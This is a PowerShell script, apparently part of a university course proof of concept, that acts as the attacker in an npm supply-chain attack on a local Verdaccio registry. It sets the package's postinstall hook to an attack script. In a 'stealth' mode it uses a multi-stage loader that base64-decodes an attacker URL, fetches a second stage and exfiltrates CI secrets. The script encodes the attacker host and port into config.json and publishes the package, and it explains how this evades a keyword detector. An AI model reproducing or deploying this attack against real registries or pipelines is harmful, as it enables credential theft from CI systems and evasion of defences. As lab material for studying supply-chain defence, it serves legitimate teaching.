<#
.SYNOPSIS
  [NT230 PoC] ACTOR 1: Attacker — Publish malicious package lên Verdaccio.

.DESCRIPTION
  Attacker chỉ làm 1 việc: publish package độc lên registry.
  Sau đó "biến mất" — không tham gia vào CI pipeline của victim.

  Supports 2 attack modes:
    -Mode noisy    : dùng postinstall-ci-attack.js (everything in 1 file, easy to detect)
    -Mode stealth  : dùng postinstall-stealth.js (multi-stage, evades IOC-1)

  Usage:
    .\1-attacker-publish.ps1                 # default: noisy mode
    .\1-attacker-publish.ps1 -Mode noisy     # explicit noisy
    .\1-attacker-publish.ps1 -Mode stealth   # multi-stage evasion
#>

param(
    [ValidateSet("noisy", "stealth")]
    [string]$Mode = "noisy",

    # IP LAN của máy attacker — victim sẽ exfil về IP này.
    # Mặc định: 172.30.0.20 (Docker bridge — demo 1 máy)
    # 2-máy: truyền vào IP LAN thật, ví dụ: -AttackerHost 192.168.1.100
    [string]$AttackerHost = "172.30.0.20",
    [int]$AttackerPort = 8080
)

$ErrorActionPreference = "Stop"
$root = Split-Path -Parent $PSScriptRoot

Write-Host "═" * 60 -ForegroundColor Red
Write-Host "[ATTACKER] Publishing malicious package (mode: $Mode)" -ForegroundColor Red
Write-Host "═" * 60 -ForegroundColor Red
Write-Host ""

# ───────────────────────────────────────────────────────────────────────────
# Bước 1: Start infrastructure (Verdaccio + Attacker receiver)
# ───────────────────────────────────────────────────────────────────────────
Write-Host "[1/3] Starting Verdaccio registry + Attacker receiver..." -ForegroundColor Yellow

Push-Location $root
docker compose -f docker-compose.verdaccio.yml up -d --build
Start-Sleep -Seconds 5

# Wait for Verdaccio
$maxRetry = 6
for ($i = 1; $i -le $maxRetry; $i++) {
    try {
        $null = Invoke-WebRequest -Uri "http://localhost:4873" -UseBasicParsing -TimeoutSec 3
        Write-Host "  Verdaccio: OK (http://localhost:4873)" -ForegroundColor Green
        break
    } catch {
        if ($i -eq $maxRetry) { Write-Host "  Verdaccio: TIMEOUT" -ForegroundColor Red; exit 1 }
        Write-Host "  Verdaccio: waiting... ($i/$maxRetry)" -ForegroundColor Yellow
        Start-Sleep -Seconds 3
    }
}

# Wait for Attacker receiver
try {
    $null = Invoke-WebRequest -Uri "http://localhost:8080/beacon" -UseBasicParsing -TimeoutSec 3
    Write-Host "  Attacker receiver: OK (172.30.0.20:8080)" -ForegroundColor Green
} catch {
    Write-Host "  Attacker receiver: waiting..." -ForegroundColor Yellow
    Start-Sleep -Seconds 3
}
Write-Host "  Network: Victim (host) → Attacker (172.30.0.20, Docker bridge)" -ForegroundColor DarkYellow
Pop-Location

# ───────────────────────────────────────────────────────────────────────────
# Bước 2: Configure malicious package.json based on mode
# ───────────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[2/3] Preparing package (mode: $Mode)..." -ForegroundColor Yellow

$pkgDir = Join-Path $root "packages\safe-marker-package"
$pkgJsonPath = Join-Path $pkgDir "package.json"

# Backup package.json gốc
$pkgJsonBackup = Join-Path $pkgDir "package.json.bak"
if (-not (Test-Path $pkgJsonBackup)) {
    Copy-Item $pkgJsonPath $pkgJsonBackup
    Write-Host "  Backed up original package.json" -ForegroundColor Gray
}

# Generate unique version with timestamp
$ts = [int][double]::Parse((Get-Date -UFormat %s))
$version = "1.0.$ts"

$pkgJson = Get-Content $pkgJsonPath -Raw | ConvertFrom-Json

if ($Mode -eq "noisy") {
    # Mode 1: Toàn bộ attack logic trong 1 file — dễ bắt bởi IOC-1
    $pkgJson.scripts.postinstall = "node scripts/postinstall-ci-attack.js"
    Write-Host "  Attack: NOISY — postinstall-ci-attack.js (single file)" -ForegroundColor Red
    Write-Host "  IOC-1 sẽ phát hiện: process.env, TOKEN/SECRET, require('http')" -ForegroundColor DarkGray
} else {
    # Mode 2: Multi-stage attack — IOC-1 v1 KHÔNG phát hiện được
    $pkgJson.scripts.postinstall = "node scripts/postinstall-stealth.js"
    Write-Host "  Attack: STEALTH — multi-stage (setup → loader → fetch stage2)" -ForegroundColor Red
    Write-Host "  IOC-1 v1 sẽ MISS: không có keyword suspicious trong entry file" -ForegroundColor DarkGray
    Write-Host "  Stage 0: postinstall-stealth.js → require('./loader')()" -ForegroundColor DarkGray
    Write-Host "  Stage 1: loader.js → đọc config.json, base64 decode URL, fetch stage2" -ForegroundColor DarkGray
    Write-Host "  Stage 2: (fetched at runtime) → exfiltrate secrets" -ForegroundColor DarkGray
}

$pkgJson.version = $version
$pkgJson | ConvertTo-Json -Depth 10 | Set-Content $pkgJsonPath -Encoding UTF8
Write-Host "  Version: $version (timestamp-based, idempotent)" -ForegroundColor Gray

# Update config.json with attacker host so payload connects to correct IP
$cfgPath = Join-Path $pkgDir "scripts\config.json"
$cdnUrl = "http://${AttackerHost}:${AttackerPort}/"
$cdnBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($cdnUrl))
$cfg = @{ host = $AttackerHost; port = $AttackerPort; cdn = $cdnBase64 }
$cfg | ConvertTo-Json | Set-Content $cfgPath -Encoding UTF8
Write-Host "  Attacker host: ${AttackerHost}:${AttackerPort} (encoded in config.json)" -ForegroundColor DarkYellow
if ($AttackerHost -ne "172.30.0.20") {
    Write-Host "  [2-MACHINE] Victim will exfil to LAN IP: $AttackerHost" -ForegroundColor Cyan
}

# ───────────────────────────────────────────────────────────────────────────
# Bước 3: Publish lên Verdaccio
# ───────────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "[3/3] Publishing to Verdaccio..." -ForegroundColor Yellow

Push-Location $pkgDir
$npmrcPath = Join-Path $pkgDir ".npmrc"
$authToken = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("demo:demo"))
Set-Content $npmrcPath "//localhost:4873/:_auth=$authToken`nregistry=http://localhost:4873/`nalways-auth=true" -Encoding UTF8

npm publish --registry http://localhost:4873 2>&1 | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
Pop-Location

Write-Host ""
Write-Host "═" * 60 -ForegroundColor Red
Write-Host "[ATTACKER] Done. Package @demo/safe-marker-package@$version published." -ForegroundColor Red
Write-Host "  Mode: $Mode" -ForegroundColor Yellow
Write-Host "  Attacker disconnects. Waiting for victim CI pipeline to trigger..." -ForegroundColor Yellow
Write-Host "═" * 60 -ForegroundColor Red
